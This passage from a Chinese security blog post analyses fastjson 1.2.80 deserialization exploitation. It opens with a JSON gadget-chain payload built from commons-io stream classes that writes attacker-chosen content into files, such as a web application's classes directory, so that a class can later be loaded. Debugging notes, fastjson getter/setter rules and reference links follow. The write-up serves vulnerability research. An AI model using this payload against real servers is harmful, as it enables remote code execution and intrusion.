+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.AutoCloseInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;in&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;input&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.CharSequenceInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;cs&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.String&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;1234&#34;</span><span class="p">,</span><span class="c1">//${shellcode}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charset&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">4</span><span class="w"> </span><span class="c1">//${size}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;branch&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.output.WriterOutputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;writer&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.output.LockableFileWriter&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;file&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;./test3&#34;</span><span class="p">,</span><span class="c1">//${filename}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;charset&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;append&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		  </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charset&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">1024</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;writeImmediately&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;closeBranch&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;reader&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;inputStream&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;$.a&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;httpContentType&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;text/xml&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;lenient&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;defaultEncoding&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">1024</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;c&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>利用图</strong></p>
+<p><img loading="lazy" src="images/image-20250624095112368.png" alt="image-20250624095112368"  />
+</p>
+<p><img loading="lazy" src="images/image-20250624090707708.png" alt="image-20250624090707708"  />
+</p>
+<p>利用调用如上，细说感觉也描述不出来，然后有几个点要说下</p>
+<ul>
+<li><code>LockableFileWriter</code> file这里初始化时，会帮我们创建目录，一般情况下<code>tomcat-docbase.xxx</code>这个目录下是没有<code>WEB-INF/classes</code>,这个目录需要我们来创建，而这里<code>LockableFileWriter</code>直接解决了这个问题</li>
+</ul>
+<p><img loading="lazy" src="images/image-20250630172922564.png" alt="image-20250630172922564"  />
+</p>
+<ul>
+<li>poc 中 $ref</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;@type&#34;: &#34;org.apache.commons.io.input.XmlStreamReader&#34;,
+</span></span><span class="line"><span class="cl">        &#34;inputStream&#34;: {
+</span></span><span class="line"><span class="cl">          &#34;$ref&#34;: &#34;$.a&#34;
+</span></span><span class="line"><span class="cl">        }
+</span></span></code></pre></div><p>在<code>XmlStreamReader</code>初始化时，<code>inputStream</code>可以直接获取到<code>$.a</code>的值，而不不是等到反序列化完，在对$ref的那种调用</p>
+<ul>
+<li>最后一个即是写入文件的坑吧，我本地调试是一次最多写入**<code>15</code>**个字符，后续写入可以<code>追加</code>写入到文件里。但是我看@1ue的poc是20个，但是在我本地环境调试来看是不行的。</li>
+</ul>
+<p>会调用2次<code>TeeInputStream#read</code>，第一次是用于写入，第二次是用于返回<code>EOF</code>达到close()文件的效果</p>
+<p><img loading="lazy" src="images/image-20250630174754931.png" alt="image-20250630174754931"  />
+</p>
+<p>后面发现<code>一次写入过多</code>时，不仅<code>没有字符</code>写入，写入对应的<code>文件</code>也操作不了（怀疑是一直处于open状态了，没close），只能写入新的文件</p>
+<p>调试发现是没有进行<code>close()</code>,后续发现是跟<code>getBOM()</code>这里有关，注意这里的<code>maxBomSize</code>这个值是作为下方<code>for的length</code>。</p>
+<p>接着下图1<code>in.read()</code>这里读取每个值，超过4个值后回到下图2中获取对应的值，<strong>每次pos会+1</strong>。<code>count</code>则是我们写入字符的长度。这里我们需要进入<code>fill()</code>（里面后续会调用TeeInputStream#read进行close()关闭流）。而这里我们可以发现如果count这里超过**<code>15</code><strong>，图1for走完<code>pos最多为15</code>就会导致</strong>进入不了fill()**，导致没有close()</p>
+<p>图1</p>
+<p><img loading="lazy" src="images/image-20250630171958453.png" alt="image-20250630171958453"  />
+</p>
+<p>图2</p>
+<p><img loading="lazy" src="images/image-20250630171900980.png" alt="image-20250630171900980"  />
+</p>
+<ul>
+<li>然后就是其实是需要调用两次<code>getBOM()</code>的，而$ref我猜测应该只能调用一次，而XmlStreamReader初始化正好能调用两次<code>getBOM()</code></li>
+</ul>
+<p><img loading="lazy" src="images/image-20250630181058377.png" alt="image-20250630181058377"  />
+</p>
+<h3 id="step4-加载class">Step4 加载class<a hidden class="anchor" aria-hidden="true" href="#step4-加载class">#</a></h3>
+<p><img loading="lazy" src="images/image-20250701172053625.png" alt="image-20250701172053625"  />
+</p>
+<p>看完感觉这个利用构造，细思极恐。挖掘去这个构造的佬太猛了!^!</p>
+<h1 id="feature结论"><strong>Feature(结论):</strong><a hidden class="anchor" aria-hidden="true" href="#feature结论">#</a></h1>
+<p>摘取于 <a href="https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d">https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d</a></p>
+<ol>
+<li>关于getter和setter
+<ol>
+<li>getter自动调用条件：
+<ol>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>以get开头且第四个字母为大写</li>
+<li>无参数传入</li>
+<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
+</ol>
+</li>
+<li>setter自动调用需要满足以下条件：
+<ol>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>返回值为void或者当前类</li>
+<li>以set开头且第四个字母为大写</li>
+<li>参数个数为1个</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li>
+<li>fastjson 在为类属性寻找getter/setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li>
+<li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li>
+</ol>
+<h2 id="版本探测">版本探测<a hidden class="anchor" aria-hidden="true" href="#版本探测">#</a></h2>
+<p><a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
+<blockquote>
+<p>参考：</p>
+<p><a href="https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d">https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d</a></p>
+<p><a href="https://www.anquanke.com/post/id/232774#h3-18">https://www.anquanke.com/post/id/232774#h3-18</a></p>
+<p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">https://github.com/luelueking/CVE-2022-25845-In-Spring</a></p>
+<p><a href="https://tttang.com/archive/1579/#toc_1268">https://tttang.com/archive/1579/#toc_1268</a></p>
+<p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p><a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
+<p><a href="https://y4er.com/posts/fastjson-1.2.80/">https://y4er.com/posts/fastjson-1.2.80/</a></p>
+<p><a href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ</a></p>
+<p>议会</p>
+<p><a href="https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf">https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf</a></p>
+<p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/%E5%8E%9F%E7%94%9Fjdk/java-file%E5%8D%8F%E8%AE%AE-%E7%AE%80%E6%9E%90/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>java file协议 简析</span>
+  </a>
+  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>jdk7u21&amp; 8u20 深度分析</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
